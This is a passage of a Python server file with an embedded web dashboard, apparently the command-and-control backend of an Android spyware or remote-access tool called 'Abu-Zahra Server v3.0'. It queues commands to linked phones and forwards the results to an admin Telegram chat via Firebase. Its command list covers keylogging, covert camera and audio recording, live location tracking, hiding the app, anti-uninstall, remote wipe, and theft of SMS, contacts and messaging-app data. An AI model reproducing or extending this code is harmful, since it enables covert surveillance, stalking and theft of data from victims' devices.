function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open');}

function showPage(name){
document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
document.getElementById('page-'+name).classList.add('active');
document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));
event.target.classList.add('active');
document.getElementById('sidebar').classList.remove('open');
}

function updateClock(){
const now=new Date();
document.getElementById('clock').textContent=now.toLocaleString('en-US');
}
setInterval(updateClock,1000);updateClock();

function populateDeviceSelects(){
const html=DEVICES.map(d=>`<option value="${d.id}">${d.name||d.id} (${d.active?'🟢':'🔴'})</option>`).join('');
['cmdDevice','fileDevice','dataDevice','monDevice'].forEach(id=>{
const el=document.getElementById(id);if(el)el.innerHTML=html;
});
}

async function loadAll(){
try{const r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
try{const r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();}}catch(e){}
try{const r=await api('web/commands');if(r.ok)renderCommandLog(r.commands);}catch(e){}
}

function renderStats(s){
const grid=document.getElementById('statsGrid');
grid.innerHTML=`
<div class="stat-card"><div class="label">⏱ Uptime</div><div class="value">${s.uptime_formatted||'-'}</div></div>
<div class="stat-card"><div class="label">📱 Devices</div><div class="value" style="color:var(--blue)">${s.devices_total}</div><div class="sub">🟢 ${s.devices_online} online</div></div>
<div class="stat-card"><div class="label">📋 Commands</div><div class="value" style="color:var(--yellow)">${s.total_registered_commands}</div><div class="sub">⏳ ${s.commands_pending} pending</div></div>
<div class="stat-card"><div class="label">📨 Messages</div><div class="value" style="color:var(--purple)">${s.messages_sent}</div></div>
<div class="stat-card"><div class="label">📡 API</div><div class="value">${s.api_hits}</div><div class="sub">hits</div></div>
<div class="stat-card"><div class="label">✅ Completed</div><div class="value" style="color:var(--green)">${s.commands_completed}</div></div>`;
}

function renderDevices(){
const el=document.getElementById('deviceList');
const dash=document.getElementById('dashDevices');
if(!DEVICES.length){
el.innerHTML='<div class="empty">No devices linked</div>';
dash.innerHTML='<div class="empty">No devices</div>';
return;
}
const card=d=>`
<div class="device-card" onclick="showDeviceDetail('${d.id}')">
<div class="name">${d.active?'🟢':'🔴'} ${d.name||d.id}</div>
<div class="meta">Model: ${d.model||'-'} | OS: ${d.os||'-'}</div>
<div class="meta">Battery: ${d.battery||'-'}% | Last: ${d.last_seen||'-'}</div>
</div>`;
el.innerHTML=DEVICES.map(card).join('');
dash.innerHTML=DEVICES.slice(0,4).map(card).join('');
}

async function showDeviceDetail(id){
try{
const r=await api('web/device/'+id);
if(!r.ok)return;
const d=r.device;const cmds=r.commands||[];
const detail=document.getElementById('deviceDetail');
detail.style.display='block';
detail.innerHTML=`
<h2>📱 ${d.name||d.id}</h2>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0">
<div><span style="color:var(--text2)">ID:</span> <code>${d.id}</code></div>
<div><span style="color:var(--text2)">Status:</span> ${d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>'}</div>
<div><span style="color:var(--text2)">Model:</span> ${d.model||'-'}</div>
<div><span style="color:var(--text2)">OS:</span> ${d.os||'-'}</div>
<div><span style="color:var(--text2)">Battery:</span> ${d.battery||'-'}%</div>
<div><span style="color:var(--text2)">Network:</span> ${d.network||'-'}</div>
<div><span style="color:var(--text2)">Location:</span> ${d.location||'-'}</div>
<div><span style="color:var(--text2)">Last Seen:</span> ${d.last_seen||'-'}</div>
</div>
<h3>📋 Recent Commands</h3>
${cmds.length?cmds.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">${c.created_at} | ID: ${c.id}</div></div>`).join(''):'<div class="empty">No commands</div>'}
<button class="btn btn-danger btn-sm" onclick="unlinkDevice('${d.id}')" style="margin-top:16px">🗑️ Unlink Device</button>`;
detail.scrollIntoView({behavior:'smooth'});
}catch(e){}
}

async function unlinkDevice(id){
if(!confirm('Unlink this device?'))return;
const r=await api('web/unlink/'+id,{method:'DELETE'});
if(r.ok){notify('Device unlinked');loadAll();}
else notify('Failed','var(--accent)');
}

async function generateLink(){
const r=await api('web/link_code');
if(r.ok){
const box=document.getElementById('linkCodeBox');
document.getElementById('linkCodeText').textContent=r.code;
box.style.display='block';
notify('Link code generated!');
}
}

const CMD_CATEGORIES={
data:{label:'📊 Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
social:{label:'🌐 Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
control:{label:'🎮 Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
apps:{label:'📦 Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
files:{label:'📂 Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
security:{label:'🔒 Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
monitor:{label:'🔍 Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
syssettings:{label:'⚙️ System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
};

function initCmdTabs(){
const tabs=document.getElementById('cmdTabs');
tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(k=>`<button class="tab${k==='data'?' active':''}" onclick="showCmdCat('${k}',this)">${CMD_CATEGORIES[k].label}</button>`).join('');
showCmdCat('data');
}

function showCmdCat(cat,btn){
if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');}
const grid=document.getElementById('cmdGrid');
grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(c=>`<button class="cmd-btn" onclick="sendDeviceCmd('${c}')">${c.replace(/_/g,' ')}</button>`).join('');
}

async function sendDeviceCmd(cmd){
const devId=document.getElementById('cmdDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
const r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
loadAll();
}

function sendCmd(cmd){
const devId=document.getElementById('fileDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
});
}
function sendDataCmd(cmd){
const devId=document.getElementById('dataDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(r=>{
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
});
}
function sendMonCmd(cmd){
const devId=document.getElementById('monDevice').value;
if(!devId){notify('Select a device','var(--accent)');return;}
api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
});
}

function renderCommandLog(cmds){
const el=document.getElementById('cmdLog');
const dash=document.getElementById('dashCommands');
const items=(cmds||[]).slice(-20).reverse();
if(!items.length){el.innerHTML='<div class="empty">No commands</div>';dash.innerHTML='';return;}
const html=items.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">Device: ${c.device_id} | ${c.created_at}</div></div>`).join('');
el.innerHTML=html;
dash.innerHTML=html;
}

async function loadEvents(){
const r=await api('web/events');
if(r.ok){
const el=document.getElementById('eventLog');
el.innerHTML=(r.events||[]).slice(-50).reverse().map(e=>`<div class="log-item"><span class="time">${(e.time||'').slice(0,19)}</span><span class="event">${e.event} ${e.details?JSON.stringify(e.details).slice(0,60):''}</span></div>`).join('')||'<div class="empty">No events</div>';
}
}

async function loadSettings(){
const r=await api('web/settings');
if(r.ok){
const s=r.settings;
document.getElementById('settingsForm').innerHTML=`
<label style="display:block;margin-bottom:12px">🔑 Admin Password<input id="setPass" value="${s.admin_password||'admin'}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
<label style="display:block;margin-bottom:12px">⏱️ Sync Interval (sec)<input id="setSync" type="number" value="${s.sync_interval||300}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
<label style="display:block;margin-bottom:12px">📍 Location Interval (sec)<input id="setLoc" type="number" value="${s.location_interval||60}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
<label style="display:block;margin-bottom:12px">🌐 Language<select id="setLang" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"><option value="ar" ${s.language==='ar'?'selected':''}>Arabic</option><option value="en" ${s.language==='en'?'selected':''}>English</option></select></label>
<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" ${s.notifications?'checked':''}> 🔔 Notifications</label>
<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" ${s.auto_location?'checked':''}> 🗺️ Auto Location</label>
<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" ${s.auto_sync?'checked':''}> 🔄 Auto Sync</label>`;
}
}

async function saveSettings(){
const data={
admin_password:document.getElementById('setPass').value,
sync_interval:parseInt(document.getElementById('setSync').value),
location_interval:parseInt(document.getElementById('setLoc').value),
language:document.getElementById('setLang').value,
notifications:document.getElementById('setNotif').checked,
auto_location:document.getElementById('setAutoLoc').checked,
auto_sync:document.getElementById('setAutoSync').checked,
};
const r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
if(r.ok)notify('Settings saved!');else notify('Failed','var(--accent)');
}

if(TOKEN){showApp();}
initCmdTabs();
setTimeout(loadSettings,500);
</script>
</body>
</html>"""

# ============================================================================
# WEB DASHBOARD ROUTE
# ============================================================================

async def serve_dashboard(request):
    return web.Response(text=DASHBOARD_HTML, content_type="text/html", charset="utf-8")

# ============================================================================
# GETUPDATES POLLING
# ============================================================================

async def tg_poll_loop():
    global tg_offset, polling_active, _processed_update_ids, _processed_message_keys
    polling_active = True
    
    # === تنظيف الاتصالات القديمة عند بدء التشغيل ===
    log.info("Cleaning old connections (deleteWebhook)...")
    try:
        session = get_tg_session()
        # حذف webhook وتجاهل التحديثات المعلقة
        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true") as resp:
            r = await resp.json()
            log.info("deleteWebhook: %s", r.get("description", r.get("ok")))
        await asyncio.sleep(1)
        # التحقق من البوت
        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe") as resp:
            me = await resp.json()
            if me.get("ok"):
                log.info("Bot connected: @%s (%s)", me["result"].get("username", "?"), me["result"].get("first_name", "?"))
            else:
                log.warning("getMe failed: %s", me)
        await asyncio.sleep(1)
    except Exception as exc:
        log.warning("Connection cleanup: %s", exc)
    
    log.info("Starting Telegram getUpdates polling...")
    
    _conflict_count = 0
    while polling_active:
        try:
            payload = {
                "offset": tg_offset,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"],
            }
            result = await tg_request("getUpdates", payload)
            if not result or not result.get("ok"):
                desc = (result or {}).get("description", "")
                if "Conflict" in desc:
                    _conflict_count += 1
                    log.warning("Conflict detected (%d), waiting...", _conflict_count)
                    await asyncio.sleep(8)
                else:
                    await asyncio.sleep(2)
                continue
            _conflict_count = 0  # إعادة العداد عند النجاح
            
            updates = result.get("result", [])
            for update in updates:
                update_id = update.get("update_id", 0)
                tg_offset = update_id + 1
                
                # === منع تكرار معالجة نفس التحديث ===
                if update_id in _processed_update_ids:
                    continue
                _processed_update_ids.add(update_id)
                if len(_processed_update_ids) > 1000:
                    _processed_update_ids = set(list(_processed_update_ids)[-500:])
                
                # Handle message
                if "message" in update:
                    msg = update["message"]
                    chat_id = msg.get("chat", {}).get("id")
                    text = msg.get("text", "")
                    msg_id = msg.get("message_id", 0)
                    
                    # === منع تكرار معالجة نفس الرسالة بالضبط ===
                    msg_key = f"{chat_id}:{msg_id}"
                    if msg_key in _processed_message_keys:
                        continue
                    _processed_message_keys.add(msg_key)
                    if len(_processed_message_keys) > 500:
                        _processed_message_keys = set(list(_processed_message_keys)[-200:])
                    
                    if chat_id != ADMIN_CHAT_ID:
                        log.warning("Unauthorized access from %s", chat_id)
                        continue
                    
                    if text.startswith("/"):
                        await handle_telegram_command(chat_id, text, msg_id)
                
                # Handle callback query
                if "callback_query" in update:
                    cb = update["callback_query"]
                    cb_id = cb.get("id", "")
                    cb_chat = cb.get("message", {}).get("chat", {}).get("id")
                    
                    # === منع تكرار معالجة نفس الـ callback ===
                    cb_key = f"cb:{cb_id}"
                    if cb_key in _processed_message_keys:
                        continue
                    _processed_message_keys.add(cb_key)
                    
                    if cb_chat != ADMIN_CHAT_ID:
                        continue
                    await handle_callback_query(cb)
        
        except asyncio.CancelledError:
            break
        except Exception as exc:
            log.error("Poll error: %s", exc)
            await asyncio.sleep(3)

# ============================================================================
# FIREBASE COMMAND RESULT LISTENER
# ============================================================================

async def firebase_result_listener():
    """Background task: Poll Firebase for results from Android app and forward to Telegram."""
    global _processed_results
    log.info("Firebase result listener started")
    while polling_active:
        try:
            results_data = await firebase_get("results")
            if results_data and isinstance(results_data, dict):
                for device_id, cmds in results_data.items():
                    if not isinstance(cmds, dict):
                        continue
                    for cmd_id, result_entry in cmds.items():
                        if not isinstance(result_entry, dict):
                            continue

                        # === Deduplication: skip already processed results ===
                        result_key = f"{device_id}:{cmd_id}"
                        if result_key in _processed_results:
                            continue

                        status = result_entry.get("status", "completed")
                        result_text = result_entry.get("result", "")
                        command = result_entry.get("command", "")

                        # Find device name
                        d = find_device(device_id)
                        dev_name = d.get("name", device_id) if d else device_id

                        # Find command registry entry
                        reg = None
                        for key, val in COMMAND_REGISTRY.items():
                            if val.get("cmd") == command:
                                reg = val
                                break
                        desc = reg.get("desc", command) if reg else command
                        emoji = reg.get("emoji", "📋") if reg else "📋"

                        # === Smart formatting based on command type ===
                        data_commands = {"get_sms", "get_calls", "get_contacts", "get_gallery", 
                                        "get_notifications", "get_apps", "get_installed_apps",
                                        "get_running_apps", "get_whatsapp", "get_telegram",
                                        "get_all", "get_location", "get_clipboard"}

                        if command in data_commands:
                            # Data commands: app already sends formatted file via TelegramDirectClient
                            # Just send brief confirmation
                            try:
                                result_json = json.loads(result_text) if result_text else {}
                                count = result_json.get("count", 0)
                                ok = result_json.get("ok", False)
                                if ok and count:
                                    msg = (f"{emoji} <b>تم جمع البيانات</b>\n\n"
                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
                                           f"📋 الأمر: <code>{desc}</code>\n"
                                           f"📊 عدد العناصر: <b>{count}</b>\n\n"
                                           f"✅ تم إرسال البيانات كملف منفصل")
                                elif ok:
                                    msg = (f"{emoji} <b>تم تنفيذ الأمر</b>\n\n"
                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
                                           f"📋 الأمر: <code>{desc}</code>\n\n"
                                           f"✅ تم بنجاح")
                                else:
                                    error_msg = result_json.get("error", "خطأ غير معروف")
                                    msg = (f"{emoji} <b>فشل تنفيذ الأمر</b>\n\n"
                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
                                           f"📋 الأمر: <code>{desc}</code>\n\n"
                                           f"❌ {error_msg}")
                            except Exception:
                                msg = (f"{emoji} <b>نتيجة الأمر</b>\n\n"
                                       f"📱 الجهاز: <code>{dev_name}</code>\n"
                                       f"📋 الأمر: <code>{desc}</code>\n"
                                       f"📊 الحالة: <code>{status}</code>")
                        else:
                            # Execution commands: show the actual result
                            try:
                                result_json = json.loads(result_text) if result_text else {}
                                ok = result_json.get("ok", False)
                                message = result_json.get("message", result_json.get("error", ""))
                                if ok:
                                    display = message if message else result_text[:500]
                                    msg = (f"{emoji} <b>تم تنفيذ الأمر</b>\n\n"
                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
                                           f"📋 الأمر: <code>{desc}</code>\n\n"
                                           f"✅ {display}")
                                else:
                                    display = message if message else (result_text[:500] if result_text else "فشل التنفيذ")
                                    msg = (f"{emoji} <b>فشل تنفيذ الأمر</b>\n\n"
                                           f"📱 الجهاز: <code>{dev_name}</code>\n"
                                           f"📋 الأمر: <code>{desc}</code>\n\n"
                                           f"❌ {display}")
                            except Exception:
                                display_result = str(result_text)[:500] if result_text else "لا توجد بيانات"
                                msg = (f"{emoji} <b>نتيجة الأمر</b>\n\n"
                                       f"📱 الجهاز: <code>{dev_name}</code>\n"
                                       f"📋 الأمر: <code>{desc}</code>\n\n"
                                       f"📦 <code>{display_result}</code>")

                        await send_admin(msg, disable_notification=True)

                        # Mark as processed
                        _processed_results.add(result_key)
                        if len(_processed_results) > 500:
                            _processed_results = set(list(_processed_results)[-200:])

                        # Delete from Firebase after forwarding
                        await firebase_set(f"results/{device_id}/{cmd_id}", None)

                        # Also update local command status
                        update_command_status(cmd_id, status, result_text)

                        log.info("Result forwarded: cmd=%s device=%s status=%s", cmd_id, device_id, status)
        except Exception as exc:
            log.error("Firebase result listener error: %s", exc)

        await asyncio.sleep(3)


# ============================================================================
# SESSION CLEANUP TASK
# ============================================================================

async def session_cleanup_loop():
    while True:
        try:
            sessions = load_json(SESSIONS_FILE, [])
            now = datetime.now(timezone.utc)
            active = []
            for s in sessions:
                try:
                    expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                    if now <= expires:
                        active.append(s)
                except:
                    continue
            save_json(SESSIONS_FILE, active)
            
            # Keep used codes and recent unused codes (lifetime codes)
            codes = load_json(LINK_CODES_FILE, [])
            used = [c for c in codes if c.get("used")]
            unused = [c for c in codes if not c.get("used")]
            # Keep only last 100 unused codes
            if len(unused) > 100:
                unused = unused[-100:]
            save_json(LINK_CODES_FILE, used + unused)
        except:
            pass
        await asyncio.sleep(3600)

# ============================================================================
# APP FACTORY & ROUTES
# ============================================================================

def create_app():
    app = web.Application(client_max_size=50*1024*1024)  # 50MB for file uploads
    
    @web.middleware
    async def log_requests(request, handler):
        if request.method == "POST":
            log.info("POST %s from %s (%s)", request.path, request.remote, request.headers.get("User-Agent", "")[:50])
        try:
            return await handler(request)
        except web.HTTPNotFound:
            log.warning("404 NOT FOUND: %s %s", request.method, request.path)
            raise
        except Exception as e:
            log.error("Request error %s %s: %s", request.method, request.path, e)
            raise
    
    # Web Dashboard
    app.router.add_get("/", serve_dashboard)
    app.router.add_get("/dashboard", serve_dashboard)
    
    # Auth API
    app.router.add_post("/api/login", api_web_login)
    
    # Device API (no auth - device authenticates via link code/token)
    app.router.add_post("/api/verify_link", api_verify_link)
    app.router.add_post("/api/register", api_register)
    app.router.add_get("/api/commands/{device_id}", api_get_commands)
    app.router.add_get("/api/commands", api_get_commands)
    app.router.add_post("/api/command_result/{command_id}", api_command_result)
    app.router.add_post("/api/data/{device_id}", api_device_data)
    app.router.add_get("/api/settings/{device_id}", api_device_settings)
    
    # Web API (requires auth)
    app.router.add_get("/api/web/devices", api_web_devices)
    app.router.add_get("/api/web/device/{device_id}", api_web_device_detail)
    app.router.add_get("/api/web/commands", api_web_commands)
    app.router.add_get("/api/web/events", api_web_events)
    app.router.add_get("/api/web/stats", api_web_stats)
    app.router.add_post("/api/web/send_command", api_web_send_command)
    app.router.add_get("/api/web/link_code", api_web_link_code)
    app.router.add_get("/api/web/settings", api_web_settings_get)
    app.router.add_put("/api/web/settings", api_web_settings_set)
    app.router.add_delete("/api/web/unlink/{device_id}", api_web_unlink)
    
    # Static files
    static_dir = Path(__file__).parent / "static"
    if static_dir.exists():
        app.router.add_static("/static", static_dir)
    
    return app


async def on_startup(app):
    ensure_data_dir()
    log.info("=" * 60)
    log.info("Abu-Zahra Server v3.0 starting...")
    log.info("Domain: %s", SERVER_DOMAIN)
    log.info("Port: %d", SERVER_PORT)
    log.info("Admin: %d", ADMIN_CHAT_ID)
    log.info("Commands: %d", len(COMMAND_REGISTRY))
    log.info("=" * 60)
    
    # Start Telegram polling in background
    app["tg_task"] = asyncio.create_task(tg_poll_loop())
    # Start session cleanup
    app["cleanup_task"] = asyncio.create_task(session_cleanup_loop())
    # Start Firebase result listener
    app["fb_listener_task"] = asyncio.create_task(firebase_result_listener())
    
    # Notify admin
    try:
        await send_admin(
            f"🟥 <b>Abu-Zahra Server v3.0</b> started!\n\n"
            f"📡 Port: <code>{SERVER_PORT}</code>\n"
            f"🌐 Domain: <code>{SERVER_DOMAIN}</code>\n"
            f"📋 Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
            f"📱 Web: <code>{SERVER_DOMAIN}/dashboard</code>"
        )
    except:
        pass


async def on_cleanup(app):
    global polling_active
    polling_active = False
    if "tg_task" in app:
        app["tg_task"].cancel()
    if "cleanup_task" in app:
        app["cleanup_task"].cancel()
    if "fb_listener_task" in app:
        app["fb_listener_task"].cancel()
    global _tg_session
    if _tg_session and not _tg_session.closed:
        await _tg_session.close()


def main():
    app = create_app()
    app.on_startup.append(on_startup)
    app.on_cleanup.append(on_cleanup)
    
    log.info("Starting server on port %d...", SERVER_PORT)
    web.run_app(app, host="0.0.0.0", port=SERVER_PORT, print=None)


if __name__ == "__main__":
    main()
